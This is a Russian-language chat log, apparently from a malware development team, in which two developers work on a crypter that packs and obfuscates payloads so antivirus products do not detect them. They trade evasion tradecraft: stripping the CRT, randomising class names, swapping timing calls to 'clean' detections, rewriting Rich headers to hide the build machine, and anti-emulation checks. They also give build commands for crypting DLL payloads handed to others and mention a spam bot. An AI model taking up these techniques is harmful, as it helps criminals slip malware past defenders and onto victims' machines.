[11.08.21 16:42:48] elroy:		Уменьши размер ключа до 1/5 размера блока, для случая с xor
[11.08.21 16:42:49] basil:		По идее размер должен увеличиться
[11.08.21 16:43:03] basil:		для xor не проблема
[11.08.21 16:43:50] basil:		но для арифметического сжатия такой фокус может не прокатить. Или нужно хранить только распределения частот отличных от нуля
[11.08.21 16:44:32] elroy:		Просто ключ для xor уменьши, для арифметического оставь как есть. Раньше ведь тоже распределение частот было для блока?
[11.08.21 16:44:44] basil:		да.
[11.08.21 16:45:11] basil:		но блоки нужно брать большими , ну хотя бы 10кб
[11.08.21 16:45:33] elroy:		Тогда должно уменьшится, в теории. Ведь у нас с учетом частоты распределения ключа размер в итоге данных был в 5 раз больше размера нагрузки (приблизительно)
[11.08.21 16:45:45] elroy:		Хорошо, берри большими.
[11.08.21 16:46:10] elroy:		Просто размер ключа поменьше сделай, по 128 байт, вполне хватит
[11.08.21 16:46:54] basil:		ок. Если блок будет маленьким смысла нет, большую часть данных займет дескриптор
[11.08.21 16:47:17] elroy:		Хорошо, согласен
[11.08.21 16:49:22] elroy:		* с учетом частот распределения
(что-то не то написал...)
[11.08.21 16:50:04] basil:		я один раз сказал разность фаз между частотами)))
[11.08.21 16:50:12] elroy:		Там вроде на 8 байт данных 40 байт частоты
[11.08.21 16:50:43] elroy:		Глубокая мысль)))
[11.08.21 16:50:59] basil:		сильно сказано!
[11.08.21 16:51:09] elroy:		Не поспоришь))
[12.08.21 09:30:59] basil:		Приветствую!
[12.08.21 09:33:03] elroy:		Приветствую
[12.08.21 09:34:30] basil:		Ну вроде в целом готово. Я паковку-распаковку протестировал. Разработку вел в отдельной ветке. Подскажи , куда ее теперь необходимо влить?
[12.08.21 09:34:49] basil:		Дошло сообщение?
[12.08.21 09:35:05] elroy:		```
 Ну вроде в целом готово. Я паковку-распаковку протестировал. Разработку вел в отдельной ветке. Подскажи , куда ее теперь необходимо влить?
Дошло сообщение?
```
[12.08.21 09:35:15] basil:		ок. хорошо
[12.08.21 09:35:46] elroy:		Я посмотрю что там, если все ок - сам солью. Спасибо.
[12.08.21 09:36:14] basil:		ты можешь сейчас говорить? или занят?
[12.08.21 09:37:09] elroy:		Занят, но говорить могу) Рассказывай)
[12.08.21 09:38:44] basil:		хорошо. там в решении 3 разных криптера. Саму паковку в SolutionBuilder я добавил. Все нормально. А в ккакой криптер распаковку добавить? Или во все?
[12.08.21 09:39:55] elroy:		Нет, не во все. Добавь в UniCrypter, там рядом с арифметическим
[12.08.21 09:41:03] elroy:		Файл UniCrypter.cpp, UniCrypter.build.cpp - это его копия, он генерируется при каждом билде на основе UniCrypter.cpp
[12.08.21 09:41:45] basil:		хорошо. Сейчас заказчик написал. Сказал на текущий момент все нормально
[12.08.21 09:41:53] basil:		По спам-боту
[12.08.21 09:42:03] elroy:		Поздравляю. Бывает же))
[12.08.21 09:42:19] basil:		Ну ладно))) Не прикалывайся
[12.08.21 09:42:21] elroy:		(заказчики не часто о таком пишут)
[12.08.21 09:43:01] basil:		не буду больше отвлекать
[12.08.21 14:44:47] elroy:		Скажи, UniCrypter.cpp еще не обновлял?
[12.08.21 14:45:14] elroy:		Скажи, UniCrypter.cpp еще не обновлял?
[12.08.21 14:46:21] basil:		нет. сейчас извини, сеанс связи. Чуть позже
[12.08.21 15:31:57] basil:		слушаю
[12.08.21 15:32:09] basil:		нет , не обновлял. Еще раз напомню
[12.08.21 15:48:55] basil:		я ничего плохого не сказал? Не обидел?
[12.08.21 15:55:04] elroy:		Не сказал. Я просто не понял суть..
[12.08.21 15:55:26] elroy:		UniCrypter.cpp когда сделаешь?)
[12.08.21 15:56:23] basil:		сейчас делаю. Скажи мне, там в коде вируальные методы присутствуют. Я могу заметить названия классов , так же как спам-боте?
[12.08.21 15:57:01] elroy:		В коде от класса лучше избавиться
[12.08.21 15:57:18] elroy:		Просто менять надо от билда к билду тогда
[12.08.21 15:57:42] basil:		хорошо. это можно
[12.08.21 16:26:47] basil:		Готово. Все залил
[12.08.21 16:28:11] elroy:		Работает?
[12.08.21 16:29:01] basil:		сейчас. Подскажи, команду билда, что бы собрать UniCrypter
[12.08.21 16:29:37] elroy:		generic если, то build -s c:\temp -p c:\temp\helloworld.exe
[13.08.21 07:40:53] basil:		Приветствую
[13.08.21 07:41:06] elroy:		Приветствую
[13.08.21 07:41:45] basil:		В общем заработал криптер. Изменения я влил. Проверил. Все вроде нормально. Можно использовать
[13.08.21 07:46:54] elroy:		Хорошо. Спасибо. Сегодня таки пятница. Почему-то мне кажутся эти задачи более простыми. Может кажутся... В любом случае спасибо)
Ты сегодня на связи?)
[13.08.21 07:48:32] basil:		Я сейчас где-то до 13,00 по МСК. Потом еще вечером с 17,20 по МСК. Если что-то случится и возникнут замечания-предложения
[13.08.21 07:49:12] basil:		Да вот еще что там классы используются. Сделал там рандомную генерацию их имен, чтобы не светились
[13.08.21 07:49:34] elroy:		Интересно, посмотрю
[13.08.21 07:49:54] basil:		хорошо. ок
[13.08.21 08:32:03] basil:		Послушай, ты говорил, что можешь помочь-проконсультировать по тестовому заданию , если мне его пришлют. Сейчас как раз такое прислали. Можешь глянуть и описать хотя бы крупными мазками как его сделать?
[13.08.21 08:34:15] elroy:		Давай посмотри
[13.08.21 08:34:27] elroy:		*посмотрим
[13.08.21 08:34:44] basil:		момент
[13.08.21 08:35:32] basil:		Реализовать небольшую key-value базу данных

Есть сервер, который слушает запросы на указанном IP:PORT
Внутреннее хранилище сервера представляет из одну boost::multi_index, который хранится в маппируемом в оперативную память файле
Ключ имеет тип - Строка (максимальная длина 1024 символа)
Значение имеет тип - Строка (максимальная длина 1024 * 1024 символа)

База данных поддерживает операции
    INSERT - добавить key:value
    UPDATE - изменить key:value
    DELETE - удалить key
    GET - получить value по key
[13.08.21 08:37:57] elroy:		Ну круто, дожились, "написать базу данных", которая еще по сети работает
[13.08.21 08:38:09] elroy:		А в чем вопрос возник?))
[13.08.21 08:38:39] elroy:		Для демонстрации понадобится еще и клиента написать
[13.08.21 08:39:14] basil:		ну клиент однопоточный. Там особых сложностей нет
[13.08.21 08:45:15] basil:		вопрос по хранилищу . В первую очередь  вот что... Если если это key:value, тогда в памяти храниться какой-то контейнер, типа std:map. В качестве контейнера используется "некто"  boost::multi_index. Хорошо. Предположим сервер принимает запросы и добавляется данные в потокобезоппасный std:map (как-то мы его сделали потобезопасным). Но вот момент, связанный с отображаемым файлом какой то странный. Предположим , что мы сериализовали std:map и записали его в файл. А потом отобразили его в память. Получается , что нам необходимо после каждого добавления данных сериализовать объект и записать его в отображаемую память.
[13.08.21 08:45:20] basil:		Так вот....
[13.08.21 08:48:54] basil:		Если мы так будем делать , то тогда какая производительность будет у сервера? Получается надо при начальной инициализации сериализовать объект БД, далее после добавления записи, сравнить сериализованный объект и объект хранящийся в отображаемой памяти. Как сравнить ? Побайтно что ли? А потом так же изменить только те участки памяти , которые изменены по сравнению с предыдущим состоянием  контейнера?
[13.08.21 08:55:20] elroy:		Про производительность в ТЗ не написано
[13.08.21 08:55:50] elroy:		Про потокобезопасность тоже
[13.08.21 08:56:04] elroy:		Любой сервер должен быть многопоточным
[13.08.21 08:56:07] elroy:		Но
[13.08.21 08:56:13] elroy:		Это указывается отдельно
[13.08.21 08:56:31] elroy:		В твоем случае в цикле читаются пакеты из сокета
[13.08.21 08:56:59] elroy:		Многопоточность решается другим путем
[13.08.21 08:57:50] elroy:		Файл в памяти обычно никто не хранит из-за того, что у него мняется структура. Либо менять ее в памяти, либо менять при созранении
[13.08.21 08:58:26] elroy:		Касательно тестового задания я бы пошел простым путем, самым простым
[13.08.21 09:03:30] elroy:		Именно map и реализация команд. А идеи предпочел бы высказать на собеседовании лично, оценив
1) стратегию обработки запросово и доступа к базе
2) вопросы производительности
база - средство для поглощения любых ресурсов, все зависит от количества клиентов, размера базы, таблиц, времени отклика, бюджета проекта на разработку.
Существуют даже методики по расчету железа под серверы с БД, в зависимоси от проекта где они применяются. Очень рекомендую почитать перед собеседованием
3) некоторые задачи вообще решаются кешем в БД и хитровыдуманными функциями по поиску по хешу и т.д.
4) вопросы оценки затрат на разработку
[13.08.21 09:04:15] elroy:		Вот именно поэтому я бы взял самый простой вариант бд - именно map и обработчик на действия insert, delete... через средства map
[13.08.21 09:08:11] basil:		Хорошо. Спасибо. По делу ответы. Еще один вопрос. Это , чисто, для себя. Вот если бы тебя спросили на собеседовании , вот прямо на ходу. "Спроектируйте на C++ кухню!" Вот как бы ты отреагировал? Он вообще корректен вопрос? Или ребята что -то курят? Или Я совсем от жизни отстал?
[13.08.21 09:08:40] basil:		Это цитата , насчет кухни
[13.08.21 09:14:08] elroy:		Даже не знаю, в ступор поставил.
Обычно если ставят в ступор я начинаю спрашивать что мне не понятно, так сказать уточнять тз. Возможно это и требовалось, поговорить. Когда уточнения заходят в тупик, то два варианта:
1) если человек отвернулся, чем-то занялся, пошел к другому кандидату - он тебя засыпал и свалил, скорее всего он просто от тебя избавился, когда спроектируешь кухню на с++, он или поржет или скажет что это не то, что надо было сделать (просто потому что ты сам не узнал что надо было сделать)
2) спрашиваешь "А как вы это (сами) представляете? Как это должно (могло бы) выглядеть?" - это скорее опять же диалог
[13.08.21 09:15:18] elroy:		Прежде чем что-то делать, выясни окончательную задачу
[13.08.21 09:15:21] basil:		ну ладно. Спасибо. это я чисто для себя
[13.08.21 09:15:25] basil:		поинтересовался
[13.08.21 09:15:47] elroy:		Да не за что..
[13.08.21 09:25:43] elroy:		Пока ты тут. Такой момент
```
size_t xorSize = (0.25+0.01*(randGen.GetRandom() % 25)) * sizeData;
```
В с++ так лучше не делать, а именно дробные числа лучше не умножать в выражении вперемешку с целыми (если целы int, size_t, а не double, double - можно).
Обычно лучше работать либо с одним представлением чисел, либо с другим. Компилятор может фигню натворить с таким выражением, откинуть в процессе вычисления дробную часть, например... Поэтому и пишут всегда для double 0.0
Если надо умножить на 0.01, лучше разделить на целое, т.е. на (int)100, чем умножать на (double)0.01
[13.08.21 09:28:44] basil:		"Если надо умножить на 0.01, лучше разделить на целое, т.е. на (int)100, чем умножать на (double)0.01". Хорошо. Запонить надо.  Лучше разделить , чем умножить
[13.08.21 09:28:55] basil:		хорошо. ок
[13.08.21 14:57:24] elroy:		Я посмотрел код, надо немного доработать
[13.08.21 14:58:04] elroy:		Я посмотрел код, надо немного доработать
[13.08.21 15:01:08] basil:		да. слушаю
[13.08.21 15:03:09] elroy:		Может помнишь, раньше, когда писал ты арифметический запаковщик, я просил чтобы распаковщик в крипте не использовал crt ?
[13.08.21 15:03:35] basil:		vector?
[13.08.21 15:03:57] basil:		или еще что-то?
[13.08.21 15:04:42] elroy:		В общем, такая просба, если решил в самом крипте для распаковки оставить классы - ладно, но crt оттуда убери. Также убери функции запаковки из крипта, там только распаковщик должен оставаться.
Если все это не сделать, спалится все... жалко
[13.08.21 15:05:10] elroy:		Вектор желательно конечно убрать, crt в планах выпилить.
[13.08.21 15:05:42] basil:		до скольки сегодня?
[13.08.21 15:05:55] elroy:		Сегодня допоздна
[13.08.21 15:06:05] basil:		отлично
[13.08.21 15:06:09] basil:		сейчас займусь
[13.08.21 15:06:15] elroy:		спасибо)
[16.08.21 09:26:27] basil:		Приветствую
[16.08.21 09:26:53] elroy:		Приветствую
[16.08.21 09:27:55] basil:		Я переделал паковщик, убрал STL, убрал ненужные методы классов в криптере, обфуцировал , протестировал. Работает. Можно пользоваться
[16.08.21 09:28:08] basil:		И залил
[16.08.21 09:28:16] elroy:		Хорошая работа
[16.08.21 09:29:07] elroy:		Посмотреть только некогда. Если протетсировал и работает, можешь раскидать по веткам и пустить в работу?
[16.08.21 09:29:24] basil:		хорошо. займусь этим
[16.08.21 09:31:22] elroy:		Есть еще задача, надо его почистить.
Последний раз я вычистил заменой кода в обфускаторе нашем, там опрос таймера, поменял функции, детект на неделю пропал, сейчас опять тот же. Надо там попробовать поменять вызов, переписать на что-то другое, похоже, может поменять вызов или разбавить какой-то математикой
[16.08.21 09:31:30] elroy:		Сейчас скажу где именно
[16.08.21 09:31:52] basil:		хорошо. пиши
[16.08.21 09:31:54] basil:		жду
[16.08.21 09:33:02] elroy:		CodeWrapper::GetHeader()
Там генерируется код.
Я менял _rdtsc на _rdtscp, это сняло детект
[16.08.21 09:33:10] elroy:		Сейчас там что-то надо придумать
[16.08.21 09:33:29] elroy:		Там не должно быть вызовов к апи
[16.08.21 09:33:37] elroy:		Просто код работает до инициализации апи
[16.08.21 09:34:08] basil:		еще что-то?
[16.08.21 09:35:10] elroy:		Чистка делается в ветке develop, когда все готово, ветка разливается по остальным. Ну соответственно, чтобы работало, надо локально вливать в develop_paylod_rundll или другую и тестить ее
[16.08.21 09:35:31] elroy:		В общем-то все.
[16.08.21 09:35:50] basil:		хорошо. спасибо. забрал.
[16.08.21 14:43:04] elroy:		Получается почистить?
[16.08.21 14:43:24] elroy:		Получается почистить?
[16.08.21 14:43:37] basil:		погоди . пока в процессе
[16.08.21 15:36:54] basil:		этот детект, зараза, постоянно меняется
[16.08.21 15:37:20] elroy:		Это значит разные штамы
[16.08.21 15:37:31] elroy:		Криптик. Чето-Там ?
[16.08.21 15:37:34] basil:		не смено)))
[16.08.21 15:37:38] basil:		смешно)))
[16.08.21 15:37:56] elroy:		Блин)
[16.08.21 15:37:57] elroy:		Я серьезно)
[16.08.21 15:37:57] elroy:		Криптик.Штам
[16.08.21 15:37:58] elroy:		?
[16.08.21 15:38:05] basil:		да
[16.08.21 15:38:07] basil:		?
[16.08.21 15:38:37] elroy:		Меняй, где-то он его палит. Это он Штам ставит другой потому как другой источник детекта, но он точно знает что этот файл
[16.08.21 15:40:16] elroy:		Я ушел, если что, буду поздно вечером
[16.08.21 15:40:22] basil:		ок
[16.08.21 15:40:27] basil:		хорошо
[16.08.21 15:40:37] elroy:		Если что, напишет wild, криптани ему, если получится что-то чистое
[16.08.21 15:40:53] basil:		я понял. ок
[16.08.21 18:50:50] elroy:		Добрый вечер
[16.08.21 18:51:09] basil:		Приветствую! еще раз
[16.08.21 18:51:13] elroy:		Какой командой криптовал bk ?
[16.08.21 18:51:30] basil:		build -s C:\\store -p C:\\crypt\\l_dll_rgsv_64_p2_25_v53_16_08_21_logs_no.dll
[16.08.21 18:51:42] elroy:		А почистить получилось?
[16.08.21 18:51:47] basil:		детекты почистил
[16.08.21 18:51:53] basil:		там такая история
[16.08.21 18:52:20] elroy:		Прекрасно. Ошибка в том, что для bk надо пробрасывать экспорт. Это делается ключем --gen-exports yes
[16.08.21 18:52:52] basil:		xor дешифровальщик засветился и  GetProcessWindowStation() почему-то ставил детект
[16.08.21 18:52:53] elroy:		Я сейчас скину набор ключей
[16.08.21 18:56:08] elroy:		```
build.bat --type dll --entropy-max-rdata 5.4 --gen-exports yes --payload %input_file% --out %output_file%
```
[16.08.21 18:56:43] elroy:		Перекриптуй, пожалуйста, отдай wild
[16.08.21 18:56:50] basil:		ок. сейчас
[16.08.21 19:01:31] basil:		там dll в итоге должно получиться?
[16.08.21 19:04:25] elroy:		да
[16.08.21 19:08:30] basil:		сегодня точно не мой день
[16.08.21 19:08:31] basil:		https://dyncheck.com/scan/id/7dfbf7112834ee1ec27c86adc3b9071f
[16.08.21 19:09:14] elroy:		Перекриптуй
[16.08.21 19:10:40] elroy:		silver скинул утром avclean, там ускорили работу, просили потестить
[16.08.21 19:10:51] elroy:		Могу скинуть, может поможет почистить
[16.08.21 19:11:14] basil:		а он работает с теми антивирусами у которых детект?
[16.08.21 19:11:31] elroy:		Он работает с default
[16.08.21 19:11:39] elroy:		Т.е. со всеми)
[16.08.21 19:12:17] elroy:		Попробуй сделать две вещи - просто рекрипт и рекрипт без ключа --entropy-max-rdata 5.4
[16.08.21 19:12:30] basil:		ок
[16.08.21 19:12:32] basil:		момент
[16.08.21 19:15:32] basil:		короче я нихера не понимаю
[16.08.21 19:15:32] basil:		https://dyncheck.com/scan/id/56022c3b6a244dcf84bcfe5d77784ef4
[16.08.21 19:15:56] elroy:		))
[16.08.21 19:16:11] elroy:		Крутой криптер написали, сам чистится)
[16.08.21 19:16:21] basil:		)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
[16.08.21 19:16:35] basil:		ты бы слышал, как я сейчас смеялся
[16.08.21 19:16:46] basil:		соседей перепугал
[16.08.21 19:16:54] basil:		ужос...
[16.08.21 19:17:32] elroy:		Он регенрируется, еще бы эти алгоритмы допилить, будет вообще классс!!
[16.08.21 19:18:04] basil:		слушай, тут один , так сказать, ньюанс
[16.08.21 19:19:00] basil:		я запустид сборку из командной строки. Выпала ошибка. Я его собрал "вручную"  в студиии
[16.08.21 19:19:07] basil:		так как бы можно?
[16.08.21 19:19:26] basil:		или я рано радовался
[16.08.21 19:20:19] elroy:		Попробуй повторить сборку из консоли. Дело в том, что после того как он собирает, он потом еще меняет rich -заголовок. rich в каком-то смысле уникален для каждой копии компилятора, это палит твою машину
[16.08.21 19:20:34] elroy:		Файл этот сохрани
[16.08.21 19:20:47] elroy:		Можно вручную рич поменять
[16.08.21 19:21:01] elroy:		Но лучше скриптом пересобрать повторно
[16.08.21 19:23:53] basil:		момент . проверяю
[16.08.21 19:24:06] elroy:		Если это все на виртуалках делается, то может и не принципиально
[16.08.21 19:24:34] basil:		https://dyncheck.com/scan/id/205695fa50dd4e0ce336decc0e508f7e
[16.08.21 19:24:50] basil:		сейчас wild скину файл, что бы проверил
[16.08.21 19:24:56] elroy:		ок
[16.08.21 19:28:04] elroy:		Сделай пока партию из 14 шт, но не проверяй на детекты, просто собери их и скинь wild
[16.08.21 19:28:23] elroy:		Оно наверняка работает
[16.08.21 19:28:26] elroy:		Я так думаю)
[16.08.21 19:28:35] basil:		сейчас пусть хоть один проверит
[16.08.21 19:29:25] basil:		но вот  эта фраза "Крутой криптер написали, сам чистится)" совсем меня убила
[16.08.21 19:29:31] basil:		))
[16.08.21 19:29:37] elroy:		)))
[16.08.21 19:29:55] elroy:		Сам пачкается, сам чистится. Живой))
[16.08.21 19:30:36] basil:		все! не смеши))) У меня уже нервная ухмылка пошла))))
[16.08.21 19:30:53] basil:		скоро он восстанет и захватит планету
[16.08.21 19:31:06] basil:		блин
[16.08.21 19:31:09] basil:		ужас
[16.08.21 19:31:16] basil:		что происходит?!
[16.08.21 19:31:30] elroy:		Да, ему только "репликацию прописать осталось", как говорил один знакомый, который вирусы пишет)))
[16.08.21 19:32:02] basil:		что правда - то правда
[16.08.21 19:33:00] elroy:		Забавная игрушка, кстати, полиморфные самореплицирующиеся вирусы
[16.08.21 19:33:23] elroy:		Его из-за полиморфности ловить не за что
[16.08.21 19:51:31] elroy:		Закриптуй тестовую нагрузку с вкладки testBuild, rundll 64 например
[16.08.21 19:51:49] basil:		момент
[16.08.21 19:51:55] basil:		это в криптопанели?
[16.08.21 19:52:01] elroy:		да
[16.08.21 19:56:01] basil:		криптовать с теми же ключами?
[16.08.21 19:56:10] elroy:		да
[16.08.21 19:57:43] basil:		готово
[16.08.21 19:58:34] elroy:		Скопируй куда-нить и проверь командой rundll32 file.dll,One
[16.08.21 19:59:05] basil:		а там ничего такого нет? или в отдельной виртуалке?
[16.08.21 19:59:58] elroy:		Конечно лучше в отдельной
[16.08.21 20:00:21] basil:		ок. хорошо
[16.08.21 20:00:26] basil:		сеть нужна?
[16.08.21 20:00:31] elroy:		Нет
[16.08.21 20:00:37] elroy:		Это hello world
[16.08.21 20:00:43] elroy:		Просто малоли
[16.08.21 20:03:39] basil:		ну честно говоря у меня падение
[16.08.21 20:03:56] elroy:		Значит что-то не так сделал
[16.08.21 20:04:10] elroy:		Имею введу, что не работает
[16.08.21 20:04:20] elroy:		Проверь, где код правил
[16.08.21 20:04:56] basil:		сейчас. Но на exe я проверял
[16.08.21 20:05:01] basil:		работало
[16.08.21 20:05:11] elroy:		Должно и на dll
[16.08.21 20:10:46] elroy:		А как его почистил? Где поменял что-то?
[16.08.21 20:11:36] basil:		там поменял алгорим xor дешифровки и  GetProcessWindowStation()
[16.08.21 20:13:25] basil:		почему он тогда exe запускал?
[16.08.21 20:14:05] elroy:		Не знаю
[16.08.21 20:15:15] elroy:		GetProcessWindowStation() где используется?
[16.08.21 20:15:30] basil:		при обфускации
[16.08.21 20:15:59] basil:		вот отсюда char* nopWinApiFunc[] удалил
[16.08.21 20:16:05] elroy:		Возможно оно не работает в dll в этом режиме, ибо window - нету
[16.08.21 20:16:24] elroy:		А
[16.08.21 20:16:29] elroy:		Просто удалил
[16.08.21 20:16:43] basil:		ну да из этого массива
[16.08.21 20:17:16] elroy:		Ясно, скинь мне xor реализацию свою, гляну свежим взглядом
[16.08.21 20:17:55] basil:		```
void XorZIP::xorCryprt(char* data, size_t dataSize, char* xorKey, size_t keySize) {
	size_t idx = 0;
	size_t keyId = 0;
	while (idx < dataSize)
	{
		if (keyId >= keySize)
			keyId = 0;
		char keyData = *(xorKey + keyId);
		char encrData = *(data + idx);
		encrData ^= keyData;
		keyData = *xorKey;
		encrData ^= keyData;
		keyId++;
		idx++;
	}
```
[16.08.21 20:18:02] basil:		было
[16.08.21 20:18:27] basil:		```
void XorZIP::xorCryprt(char* data, size_t dataSize, char* xorKey, size_t keySize) {
	// <codeobfuscator:begin_function>
	size_t idx = 0;
	size_t keyId = 0;
	size_t i = 0;
	for (size_t i = 0; dataSize > i; i++)
	{
		char keyData = *(xorKey + keyId);
		char encrData = *(data + idx);
		encrData ^= keyData;
		keyId++;
		if (keyId >= keySize)
			keyId = 0;
		keyData = *xorKey;
		idx++;
		encrData ^= keyData;

	}
	// <codeobfuscator:end_function>
}
```
[16.08.21 20:18:34] basil:		стало
[16.08.21 20:20:39] elroy:		А поменял в обоих местах?
[16.08.21 20:20:57] elroy:		Т.е. в solutionbuilder тоже?
[16.08.21 20:21:03] basil:		нет. только в самом криптере
[16.08.21 20:21:18] elroy:		Поменяй в обоих местах.....
[16.08.21 20:21:20] basil:		сейчас еще раз helloworld exe pfgeoe
[16.08.21 20:21:23] basil:		запущу
[16.08.21 20:23:14] elroy:		Возможно дело в этом
[16.08.21 20:23:16] elroy:		// <codeobfuscator:end_function>
[16.08.21 20:23:23] elroy:		Это не полная конструкция
[16.08.21 20:23:28] elroy:		Надо это убрать
[16.08.21 20:23:32] elroy:		Наверное
[16.08.21 20:23:47] basil:		хорошо. сейчас попробуем
[16.08.21 20:24:23] elroy:		и это тоже
	// <codeobfuscator:begin_function>
[16.08.21 20:26:42] basil:		ну вот я сейчас откатил к коммиту. Там только сгенерированный код изменился. Exe helloworld отработал корректно
[16.08.21 20:27:03] elroy:		В коде выше dataSize > i
[16.08.21 20:27:16] elroy:		i < dataSize
[16.08.21 20:27:50] elroy:		Если  dataSize > i, то на 1 выходишь
[16.08.21 20:28:33] basil:		что то не то говоришь
[16.08.21 20:29:02] basil:		иммешь ввиду что цикл обеспечивает только одну итерацию?
[16.08.21 20:31:30] elroy:		Даже меня запутал))
[16.08.21 20:32:22] basil:		хорошо. сейчас удалю. Сделаю одинаково
[16.08.21 20:35:11] basil:		для exe нормально. Сейчас dll
[16.08.21 20:40:41] basil:		все равно падает
[16.08.21 20:40:49] basil:		пока не знаю
[16.08.21 20:40:58] basil:		почему
[16.08.21 20:42:29] elroy:		Слушай, а можешь там же забрать в соседнюю папку ветку develop_payload_bk, как на есть, и закриптовать тестовую нагрузку?
[16.08.21 20:43:00] elroy:		Т.е. без изменений, а прям как в гите
[16.08.21 20:43:38] basil:		тут у меня новая новость. 64 битный exe не собирает
[16.08.21 20:44:08] basil:		[ ](https://xflemdsxjrjilw34dsxpvrxp5whnaut7hc5xejwuqs6eqrkt77bxkwid.onion/direct/EJQkNyvZiknnByYGSLcSmTknPEhLY3pJkz?msg=eQkFoTHR7ibQQFYuf) что то я ничего не понял
[16.08.21 20:44:31] basil:		[ ](https://xflemdsxjrjilw34dsxpvrxp5whnaut7hc5xejwuqs6eqrkt77bxkwid.onion/direct/EJQkNyvZiknnByYGSLcSmTknPEhLY3pJkz?msg=eQkFoTHR7ibQQFYuf) вот по э
[16.08.21 20:50:04] basil:		послушай, я , конечно, извиняюсь. Но я на сегодня все. Иначе завтра не встану
[16.08.21 20:50:21] elroy:		Ладно
[17.08.21 09:55:31] elroy:		Приветствую
[17.08.21 09:55:41] basil:		приветствую
[17.08.21 09:56:04] elroy:		Насчет алгоритма арифметического сжатия, разбавленного xor
[17.08.21 09:57:19] elroy:		Скажи. где я просчитался?
Это усовершенствование должно уменьшать размер запаковки. Если используется xor, то получается, что увеличения размера быть не должно, разве что ключ.
[17.08.21 09:57:51] basil:		Я думаю, что причина в дескрипторе арифметического сжатия
[17.08.21 09:59:55] basil:		его размер минимум 4 кб. Плюс не известно насколько сильно арифметическое сжатие сжимает данные. Если это текс, читаемый человеком - тогда хорошо сжимает. Низкая эентропия. Если это разроозненные данные - тогда плохо сжимает. Плюс у xor шифрования размер ключа варьируется от блока к блоку
[17.08.21 10:00:44] basil:		можем сделать xor ключ фиксированного размера , скажем 4 байта
[17.08.21 10:01:05] basil:		дескриптор арифметического сжатия тоже можно уменьшить
[17.08.21 10:01:31] basil:		храня в нем частоты встречающихся символов, только в случае если эта частота отлична от нуля
[17.08.21 10:04:52] elroy:		Ксор ключ должен вычисляться. На старте задай какое-то значение, с плавающей запятой, допустим double лун = 1000000.0, затем на каждый фрагмент, который идет под xor сделай какую-то математиескую функцию, изменеия этого значения.
И дальше просто переводит его в long long (8 байт) и используй как xor ключ эти 8 байт
[17.08.21 10:06:30] elroy:		Таким образом ключ будет генерироваться каждый раз на ходу и не будет хранитсья в дескрипторах. Ключ сокращаем из дескрипторов - выигрываем пространство.
> только в случае если эта частота отлична от нуля
попробуй так, но так придется хранить значение самой частоты, возможно это больше, чем нули.. надо попробовать
[17.08.21 10:07:06] basil:		хорошо. давай так
[17.08.21 10:08:03] elroy:		*функцию одну, на все фрагменты. Просто вызвать ее каждый раз и передавать в нее текущее значение double, получать новое, оно становится текущим и так далее
[17.08.21 10:09:40] basil:		А ты хочешь один xor ключ и потом он сам вычисляется.... Интресно)))) Ок. понял
[17.08.21 10:10:23] elroy:		Да, и короткий, всего 8 байт будет вполне достаточно.
[17.08.21 10:10:39] elroy:		Кстати
Можно еще иначе поступить, добы ускорить работу
[17.08.21 10:11:57] elroy:		Можно double рассмотреть как 8 байт
Что-то типа
```
double a;
char* key = (char*)&a;
```
Это key на 8 байт
[17.08.21 10:12:32] basil:		ок. основную мысль понял
[17.08.21 10:14:02] basil:		вообще интересное решение
[17.08.21 10:16:13] elroy:		Чистку я себе оставлю, сейчас им займусь. Просто доработай запаковщик в той отдельной ветке
[17.08.21 10:20:12] basil:		отдельную ветку делать?
[17.08.21 10:20:36] basil:		еще одну?
[17.08.21 10:23:09] basil:		а понял
[17.08.21 10:23:20] elroy:		Ты вроде делал недавно под xor
[17.08.21 10:23:23] elroy:		ок
[17.08.21 16:01:05] elroy:		добрый вечер.)
[17.08.21 16:01:12] basil:		Приветствую
[17.08.21 16:01:58] elroy:		По моим наблюдениям парни из eset научились эмулировать ту защиту с измерениями времени, обнаружением многозадачной среды
[17.08.21 16:02:14] elroy:		Поэтому похоже и палится код. По эмуляции...
[17.08.21 16:02:56] basil:		Хорошо... Точнее плохо. Чем я могу помочь?
[17.08.21 16:03:30] elroy:		Пока ничем... Решением своей задачи с xor. Просто делюсь)
[17.08.21 16:05:11] basil:		а вот оно что.... Может тогда этот кусок кода убрать?
[17.08.21 16:05:23] basil:		моя конечно задача за мной
[17.08.21 16:05:27] basil:		естественно
[17.08.21 16:05:53] elroy:		Может и убрать, но это откроет для всех остальных исследователей двери
[17.08.21 16:06:34] basil:		т.е. позволит им эмулировать исполненние в ВМ?
[17.08.21 16:06:36] elroy:		Палится не код, он гад его эмулирует и проходит правильно)
[17.08.21 16:06:48] elroy:		Да, верно
[17.08.21 16:06:58] elroy:		другие ав не могут эмулировать
[17.08.21 16:07:18] elroy:		И исследователи в отлидчике тоже натыкаются, подвисают на этом
[17.08.21 16:08:06] basil:		да уж для нас новость  новость, конечно, не кекс. К сожалению
[17.08.21 16:08:24] elroy:		А так хорошо все начиналось, когда первый раз парни из eset прилепили детект на иконку )))
[17.08.21 16:09:13] basil:		НАчальство вставило видимо.... Мне почему-то так кажется
[17.08.21 16:09:46] basil:		но вчерашняя фраза про "сам чистится" была конечно круче. До сих пор смешки
[17.08.21 16:09:48] basil:		у меняэ
[17.08.21 16:10:10] elroy:		Ниче, сделаем, будет сам чиститься
[17.08.21 16:10:30] basil:		будем надеяться
[18.08.21 09:40:25] basil:		Приветствую
[18.08.21 09:44:52] elroy:		Приветствую
[18.08.21 09:46:09] basil:		Послушай, вчера пытался реализовать твою идею с использованием double в качестве ключа и пришел в выводу, что это не очень хорошая идея. И вот почему
[18.08.21 09:49:11] basil:		Второе
[18.08.21 09:49:11] basil:		Во первых надо как-то инициализировать начальное значение double. В SolutionBuilder это сделать относительно легко - делаем случайное double и все нормально. Сложности возникают , когда нужно это число перенести в UniCrypter при испольовании std::to_string(double i) - идет потеря данных, по крайней мере у меня. Это первое
[18.08.21 09:52:12] basil:		Значение double вариьруются в достаточно больших пределах. Я пробовал синус использовать , логарифм, степенные функции и так далее. Для определения текущего значения ключа. И что я вижу, меняется в основном первые 3 байта, остальное как-то не очень меняется. Попробовал использовать функцию факториал - тут же получил переполнение.
[18.08.21 09:52:28] basil:		Третье
[18.08.21 09:56:40] basil:		Первый пунк в принципе можно обойти , используя 8 последних байт в качестве ключа,  но тогда получается , что нет необходимости использовать double и просто используем какой-то учаток данных из шифруемого блока и применяем его по старой схеме. Это если нужно как-то уменьшить объем зашифрованной информации на выходе. Короче, на мой взгляд double как-то не совсем правильная идея. Есть там еще как-то "подводный камень" но сейчас конкретно не могу вспомнить. Что -то еще там мешало
